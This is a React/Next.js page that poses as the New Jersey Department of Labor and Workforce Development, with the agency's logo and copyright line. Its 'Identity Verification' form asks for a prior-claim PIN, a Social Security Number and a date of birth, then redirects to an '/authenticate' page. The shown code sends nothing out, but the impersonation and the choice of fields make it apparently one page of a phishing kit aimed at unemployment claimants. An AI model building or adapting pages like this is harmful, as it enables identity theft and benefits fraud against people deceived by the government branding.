import styles from '../styles/Home.module.css';
import { useRef } from 'react';
import { useRouter } from 'next/router';

const Verify = () => {
    const form = useRef();
    const router = useRouter();

    const handleSubmit = (e) => {
        e.preventDefault();
        const pin = form.current.pin.value;
        const ssn = form.current.ssn.value;
        const dob = form.current.dob.value;

        if (!pin || !ssn || !dob) {
            alert('Please fill in all fields.');
            return;
        }
        // Redirect to authenticate page if all fields are filled
        router.push('/authenticate');
    };

    return (
        <div className={styles.container}>
            {/* Logo Section */}
            <div className={styles.logoWrapper}>
                <img
                    src="/ASSET/njdol_logo_stamp.svg"
                    alt="NEW JERSEY LOGO"
                    className={styles.logo}
                />
            </div>

            {/* Verification Form Section */}
            <div className={styles.formSection}>
                <form className={styles.loginForm} ref={form} onSubmit={handleSubmit}>
                    {/* Only this professional, italic, and prominent direction message */}
                    <p style={{
                        fontStyle: 'italic',
                        color: '#254d73',
                        fontSize: '1.08rem',
                        margin: '0 0 12px 0',
                        textAlign: 'center',
                        fontWeight: 500,
                        letterSpacing: '0.01em'
                    }}>
                        <span style={{fontWeight: 600, textDecoration: 'underline'}}>Note:</span> Enter the last 4 digit pin number that was established from prior claim
                    </p>
                    <h2 className={styles.heading}>Identity Verification</h2>
                    <input
                        type="text"
                        id="pin"
                        name="pin"
                        placeholder="PIN"
                        className={styles.input}
                        required
                    />
                    <input
                        type="text"
                        id="ssn"
                        name="ssn"
                        placeholder="Social Security Number"
                        className={styles.input}
                        required
                    />
                    <input
                        type="date"
                        id="dob"
                        name="dob"
                        placeholder="Date of Birth"
                        className={styles.input}
                        required
                    />
                    <button type="submit" className={styles.button}>
                        Submit
                    </button>
                </form>
            </div>
            <footer className={styles.footer}>
                <p>© New Jersey Department of Labor and Workforce Development(NJLWD). All Rights Reserved.</p>
            </footer>
        </div>
    );
};

export default Verify;